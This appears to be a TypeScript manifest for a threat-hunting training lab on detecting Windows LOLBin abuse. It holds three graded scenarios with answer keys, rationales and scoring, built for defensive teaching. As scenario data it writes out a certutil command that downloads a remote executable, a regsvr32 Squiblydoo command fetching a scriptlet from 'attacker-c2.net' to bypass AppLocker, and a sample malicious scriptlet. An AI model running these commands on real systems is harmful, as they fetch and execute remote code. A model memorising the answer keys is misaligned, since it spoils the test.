import type { LabManifest } from "../../types/manifest";

export const lolbinsDetectionLab: LabManifest = {
  schemaVersion: "1.1",
  id: "lolbins-detection",
  version: 1,
  title: "Living-off-the-Land Binaries (LOLBins) Detection",

  tier: "advanced",
  track: "detection-hunting",
  difficulty: "challenging",
  accessLevel: "free",
  tags: ["lolbins", "living-off-the-land", "detection", "threat-hunting", "windows", "defense-evasion"],

  description:
    "Identify attacker abuse of legitimate Windows binaries (certutil, mshta, rundll32, regsvr32) to download payloads, execute code, and evade detection — distinguishing malicious LOLBin usage from legitimate administrative use.",
  estimatedMinutes: 12,
  learningObjectives: [
    "Identify LOLBin abuse patterns across certutil, mshta, rundll32, and regsvr32",
    "Distinguish malicious LOLBin execution from legitimate Windows administrative use",
    "Recognize the specific flags and argument patterns that indicate LOLBin abuse",
  ],
  sortOrder: 750,

  status: "published",
  prerequisites: [],

  rendererType: "investigate-decide",

  scenarios: [
    {
      type: "investigate-decide",
      id: "lol-001",
      title: "Certutil Used as Download Tool",
      objective:
        "EDR alert on certutil.exe execution with unusual arguments. Investigate whether this represents LOLBin abuse.",
      investigationData: [
        {
          id: "command-line",
          label: "Certutil Execution",
          content:
            "certutil.exe -urlcache -split -f http://185.220.101.47/update.exe C:\\Users\\Public\\update.exe\nFollowed by: C:\\Users\\Public\\update.exe (new process, unsigned PE, not present in file reputation database)",
          isCritical: true,
        },
        {
          id: "process-tree",
          label: "Process Tree",
          content:
            "cmd.exe (PID 5821) → certutil.exe (PID 5902) → [file written: update.exe]. Then: cmd.exe → update.exe (PID 6001). Parent of cmd.exe: outlook.exe (PID 3847).",
          isCritical: true,
        },
        {
          id: "network-activity",
          label: "Network Activity",
          content:
            "HTTP GET to 185.220.101.47:80/update.exe. Source host: WORKSTATION-07. 847KB binary downloaded. IP 185.220.101.47 has Threat Intelligence tags: Tor exit node, previously associated with malware distribution.",
          isCritical: true,
        },
        {
          id: "certutil-context",
          label: "Certutil Normal Use Context",
          content:
            "Certutil is a Windows certificate utility. Legitimate uses: display/verify certificates, manage certificate store. The -urlcache -split -f flags are commonly documented as a download technique — not a certificate management function.",
        },
      ],
      actions: [
        {
          id: "ISOLATE_KILL_INVESTIGATE",
          label: "Isolate WORKSTATION-07, kill update.exe, preserve memory dump, trigger IR",
          color: "red",
        },
        {
          id: "BLOCK_IP_MONITOR",
          label: "Block 185.220.101.47 and monitor update.exe behavior",
          color: "orange",
        },
        {
          id: "DELETE_FILE",
          label: "Delete update.exe and alert the user",
          color: "yellow",
        },
        {
          id: "ANALYZE_FIRST",
          label: "Sandbox analyze update.exe before taking containment action",
          color: "blue",
        },
      ],
      correctActionId: "ISOLATE_KILL_INVESTIGATE",
      rationales: [
        {
          id: "rat-lolbin-confirmed",
          text: "This is confirmed LOLBin abuse: certutil.exe -urlcache -split -f is a well-documented download technique, not certificate management. The downloaded binary (update.exe) is already executing, came from a Tor exit node with malware history, and the entire chain (Outlook → cmd → certutil download → execute) is a confirmed spear-phishing payload delivery pattern. update.exe is currently running — memory preservation before killing the process captures command-and-control artifacts. Sandbox analysis is appropriate for threat intelligence but shouldn't delay containment when an unsigned binary from a Tor exit node is already executing.",
        },
        {
          id: "rat-block-monitor",
          text: "update.exe is already executing and may have already established persistence or lateral movement. 'Monitor behavior' while malware runs is not a containment strategy.",
        },
        {
          id: "rat-delete-alert",
          text: "Deleting the file may terminate the current execution but doesn't address what update.exe has already done (persistence, lateral movement, data collection). Memory forensics is required to understand the full impact.",
        },
        {
          id: "rat-sandbox-first",
          text: "Sandbox analysis is valuable intelligence but takes 10-30 minutes during which update.exe is actively executing on a networked workstation. Isolate first, then sandbox the sample.",
        },
      ],
      correctRationaleId: "rat-lolbin-confirmed",
      feedback: {
        perfect: "Correct. Certutil -urlcache downloading from a Tor exit node with Outlook as grandparent is a confirmed spear-phishing LOLBin chain. Isolate and preserve memory immediately.",
        partial: "Sandbox analysis or monitoring while malware executes delays necessary containment. Isolate first, then investigate.",
        wrong: "Certutil -urlcache is documented malware behavior, not legitimate certificate management. The binary is actively running from a known bad IP. Immediate isolation is required.",
      },
    },
    {
      type: "investigate-decide",
      id: "lol-002",
      title: "Regsvr32 Squiblydoo Technique",
      objective:
        "Security monitoring flagged regsvr32.exe execution with a network path. Analyze whether this is the Squiblydoo LOLBin technique.",
      investigationData: [
        {
          id: "regsvr32-execution",
          label: "Regsvr32 Command",
          content:
            "regsvr32.exe /s /n /u /i:http://attacker-c2.net/payload.sct scrobj.dll\nThis uses regsvr32 to fetch and execute a remote scriptlet file (SCT). The /i: flag allows a URL-based scriptlet.",
          isCritical: true,
        },
        {
          id: "network-connection",
          label: "Outbound HTTP Request",
          content:
            "HTTP GET to attacker-c2.net/payload.sct. Response: XML scriptlet containing JavaScript. Threat Intel: attacker-c2.net registered 3 days ago, no prior web presence, registered anonymously.",
          isCritical: true,
        },
        {
          id: "scriptlet-content",
          label: "SCT File Contents",
          content:
            "<?XML version='1.0'?><scriptlet><registration><script language='JScript'><![CDATA[var shell = new ActiveXObject('WScript.Shell'); shell.Run('cmd.exe /c whoami > C:\\\\ProgramData\\\\output.txt');]]></script></registration></scriptlet>",
        },
        {
          id: "whitelisting-context",
          label: "Application Whitelist Status",
          content:
            "WORKSTATION-22 has AppLocker configured. AppLocker blocks unsigned executables. Regsvr32.exe is a signed Microsoft binary and bypasses AppLocker — this is the primary reason attackers use this technique.",
          isCritical: true,
        },
      ],
      actions: [
        {
          id: "ISOLATE_APPLOCKER_UPDATE",
          label: "Isolate workstation, block regsvr32 network access, update AppLocker to restrict regsvr32 scriptlets",
          color: "red",
        },
        {
          id: "ISOLATE_ONLY",
          label: "Isolate the workstation",
          color: "orange",
        },
        {
          id: "UPDATE_APPLOCKER",
          label: "Update AppLocker rules without isolating — the script only ran whoami",
          color: "yellow",
        },
        {
          id: "INVESTIGATE_SCRIPTLET",
          label: "Investigate the full scriptlet content before taking action",
          color: "blue",
        },
      ],
      correctActionId: "ISOLATE_APPLOCKER_UPDATE",
      rationales: [
        {
          id: "rat-squiblydoo",
          text: "This is the Squiblydoo technique — regsvr32 executing a remote SCT file to achieve AppLocker bypass. The current scriptlet ran whoami (reconnaissance), but this is reconnaissance only — the technique confirms code execution capability from a 3-day-old malicious domain. Isolate the workstation (confirmed external code execution), then update AppLocker to block regsvr32 from accessing network paths (AppLocker can restrict regsvr32 scriptlet sources). The whoami output suggests this may be an early-stage attack — the attacker confirmed execution capability and may return with a more damaging payload.",
        },
        {
          id: "rat-isolate-only",
          text: "Isolation without AppLocker update leaves the same vulnerability on all other similarly-configured workstations in the environment.",
        },
        {
          id: "rat-applocker-only",
          text: "The scriptlet confirmed remote code execution capability on this workstation. Even if it only ran whoami, the attacker knows they have execution and may follow up. Isolate while investigating.",
        },
        {
          id: "rat-investigate-first",
          text: "The SCT file content is visible — it ran whoami. The investigation needed is why it executed and what AppLocker policy changes will prevent recurrence, not what the scriptlet contained.",
        },
      ],
      correctRationaleId: "rat-squiblydoo",
      feedback: {
        perfect: "Correct. Squiblydoo confirms AppLocker bypass capability. Isolate the workstation and update AppLocker to restrict regsvr32 network scriptlet access across the environment.",
        partial: "Isolate and fix the AppLocker gap together. The same technique works on every workstation with the same AppLocker policy — fix both the symptom and the root cause.",
        wrong: "'Only ran whoami' understates the risk — this confirmed remote code execution on a network-connected workstation. Isolation is required when external code execution is confirmed.",
      },
    },
    {
      type: "investigate-decide",
      id: "lol-003",
      title: "False Positive — Mshta Legitimate Corporate App",
      objective:
        "Alert on mshta.exe (HTML Application Host) execution. Mshta is frequently abused for LOLBin attacks. Investigate whether this is malicious.",
      investigationData: [
        {
          id: "mshta-execution",
          label: "Mshta Execution",
          content:
            "mshta.exe C:\\ProgramData\\CorporateIT\\HelpDesk\\helpdesklaunch.hta\nFile C:\\ProgramData\\CorporateIT\\HelpDesk\\helpdesklaunch.hta exists on disk, created 8 months ago during IT deployment.",
        },
        {
          id: "file-context",
          label: "HTA File Analysis",
          content:
            "helpdesklaunch.hta is an HTML Application that opens the internal IT help desk portal (https://helpdesk.company.internal) in an IE-based window. File hash matches 1,247 other corporate workstations that received the same IT deployment package.",
          isCritical: true,
        },
        {
          id: "deployment-history",
          label: "Deployment History",
          content:
            "File deployed via SCCM package 'Helpdesk Launcher v1.2' on 2025-07-15. SCCM package signed by corporate IT code-signing certificate. Shortcut placed in Start Menu. Users open it to access the help desk portal.",
        },
        {
          id: "behavior-analysis",
          label: "Behavior at Execution",
          content:
            "mshta.exe opens IE window to https://helpdesk.company.internal. No network connections to external IPs. No child processes spawned. No file writes outside standard IE cache. User double-clicked the Start Menu shortcut.",
        },
      ],
      actions: [
        {
          id: "MARK_ALLOWLIST",
          label: "Mark as false positive, add helpdesklaunch.hta to allowlist, tune detection rule",
          color: "green",
        },
        {
          id: "REMOVE_HTA",
          label: "Remove mshta.exe ability to run and replace with a browser shortcut",
          color: "orange",
        },
        {
          id: "INVESTIGATE_ALL_1247",
          label: "Investigate all 1,247 workstations with this file",
          color: "yellow",
        },
        {
          id: "BLOCK_MSHTA",
          label: "Block mshta.exe across the organization — too high a risk",
          color: "red",
        },
      ],
      correctActionId: "MARK_ALLOWLIST",
      rationales: [
        {
          id: "rat-legitimate-hta",
          text: "This is a legitimate IT-deployed HTA application: same file hash on 1,247 corporate workstations, deployed via signed SCCM package 8 months ago, opens only an internal help desk URL, no external connections, no child processes. This matches every indicator of a legitimate corporate deployment and no indicators of malicious use. Mark as false positive and tune the detection rule to exclude the specific file hash or path. While mshta.exe is frequently abused, the context here definitively establishes legitimate use.",
        },
        {
          id: "rat-remove-hta",
          text: "Removing a legitimate IT tool used by 1,247 employees to access the help desk would unnecessarily disrupt IT support workflows. If a browser-based replacement is preferred, that's an IT project — not a security incident response.",
        },
        {
          id: "rat-investigate-all",
          text: "Investigating 1,247 workstations for a verified IT deployment package wastes significant security resources and creates unnecessary alarm.",
        },
        {
          id: "rat-block-mshta",
          text: "Blocking mshta.exe organization-wide without evaluating whether any legitimate HTA applications exist would break IT workflows. Evaluate the specific file hash first — if no legitimate HTA applications exist, blocking mshta is reasonable, but that investigation needs to happen first.",
        },
      ],
      correctRationaleId: "rat-legitimate-hta",
      feedback: {
        perfect: "Correct. Same hash on 1,247 workstations from a signed SCCM package opening an internal URL is definitively a corporate IT deployment, not malware. Allowlist and tune.",
        partial: "The SCCM deployment history and matching hash across 1,247 workstations establishes legitimate provenance. Tune the detection to recognize this pattern.",
        wrong: "Blocking mshta organization-wide for a verified corporate IT application would be unnecessarily disruptive. Context and provenance distinguish legitimate HTA use from LOLBin abuse.",
      },
    },
  ],

  hints: [
    "LOLBin abuse indicators: unusual flags for the binary's stated purpose (certutil -urlcache is not certificate management), unexpected parent processes (Office apps spawning cmd/certutil), and network connections to newly-registered or threat-intel-flagged domains.",
    "The Squiblydoo technique (regsvr32 + SCT files) is specifically designed to bypass AppLocker — add AppLocker rules restricting regsvr32 from loading network-hosted scriptlets.",
    "Same file hash on hundreds of corporate workstations from a signed management package is a strong legitimate indicator — scale and provenance distinguish IT deployments from attacks.",
  ],

  scoring: {
    maxScore: 100,
    hintPenalty: 5,
    penalties: { perfect: 0, partial: 10, wrong: 20 },
    passingThresholds: { pass: 80, partial: 50 },
  },

  careerInsight:
    "LOLBins detection is one of the hardest problems in threat hunting because attackers are abusing signed Windows binaries that are difficult to block. Security engineers who can write detection logic that distinguishes LOLBin abuse from legitimate use are in high demand for mature security operations teams.",
  toolRelevance: [
    "LOLBAS Project (lolbas-project.github.io)",
    "Sysmon (process creation with command line logging)",
    "Elastic SIEM (LOLBin detection rules)",
    "CrowdStrike Falcon (behavioral LOLBin detection)",
  ],

  createdAt: "2026-03-27",
  updatedAt: "2026-03-27",
};
